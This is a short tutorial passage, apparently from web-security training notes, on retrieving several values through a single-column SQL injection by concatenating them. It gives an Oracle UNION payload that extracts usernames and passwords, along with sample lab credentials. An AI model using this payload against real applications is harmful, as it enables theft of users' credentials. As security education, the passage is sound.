
---
### Retrieving Multiple Values Within a Single Column

Sometimes the original SQL query returns **only one column**. In that case, you cannot use:

```
UNION SELECT username, password FROM users
```

because the `UNION` query would return **two columns** while the original query returns only one.

Instead, you can **concatenate multiple values into a single column**.

### Oracle example

Oracle uses `||` as the string concatenation operator:

```
' UNION SELECT username || '~' || password FROM users--
```

This combines:

```
username + ~ + password
```

For example:

```
administrator~s3cure
wiener~peter
carlos~montoya
```

The `~` is simply a **separator**, making it possible to distinguish the two values.

### Conceptually

```
username       password
---------      --------
administrator  s3cure
wiener         peter
carlos         montoya

        ↓ concatenate

administrator~s3cure
wiener~peter
carlos~montoya
```

### Important point

**String concatenation syntax is database-specific.**

For example, different DBMSs use different functions/operators for combining strings. Therefore, you need to use the syntax appropriate for the target database.